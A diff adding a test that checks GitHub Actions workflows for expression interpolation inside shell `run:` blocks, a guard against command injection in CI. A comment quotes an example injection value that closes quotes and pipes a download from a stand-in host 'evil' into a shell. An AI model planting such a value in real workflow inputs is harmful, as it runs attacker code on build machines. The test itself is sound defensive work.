@@ -209,6 +209,32 @@ test("the training workflow fetches before it trains, and caches what it fetched
   assert.ok(wf.indexOf("fetch_corpus.py") < wf.indexOf("adhd_analysis.text.train"), "it trains before it fetches");
 });
 
+test("no workflow interpolates an expression into a shell script", () => {
+  // `${{ }}` inside `run:` is textual substitution before the shell sees it, so an input of
+  // `1500" ; curl evil | sh ; echo "` closes the quotes and runs. Through `env:` the same value is a
+  // shell variable and cannot. Every one of these is behind write access today; the pattern is what
+  // stops being safe the day a trigger widens, which is why this is a test and not a review note.
+  //
+  // `env:`, `with:`, `key:` and `if:` are YAML values rather than script, so only `run:` is scanned.
+  const dir = join(ROOT, ".github", "workflows");
+  for (const file of readdirSync(dir).filter((f) => f.endsWith(".yml"))) {
+    const lines = readFileSync(join(dir, file), "utf8").split("\n");
+    let indent: number | null = null;
+    lines.forEach((line, i) => {
+      const open = /^(\s*)(?:- )?(?:name:.*\n)?\s*run: *[|>]/.exec(line);
+      if (open) { indent = open[1]!.length; return; }
+      if (indent === null) return;
+      const width = line.length - line.trimStart().length;
+      if (line.trim() && width <= indent) { indent = null; return; }
+      if (line.trimStart().startsWith("#")) return;
+      assert.ok(
+        !/\$\{\{/.test(line),
+        `${file}:${i + 1} interpolates an expression into a shell script: ${line.trim()}`,
+      );
+    });
+  }
+});
+
 test("the weekly job trains on one side of the split and scores the other", () => {
   // Without `--held-out-every` the trainer reads the whole manifest and the next step scores one
   // document in twenty of that same manifest. That is a memorisation score wearing the name
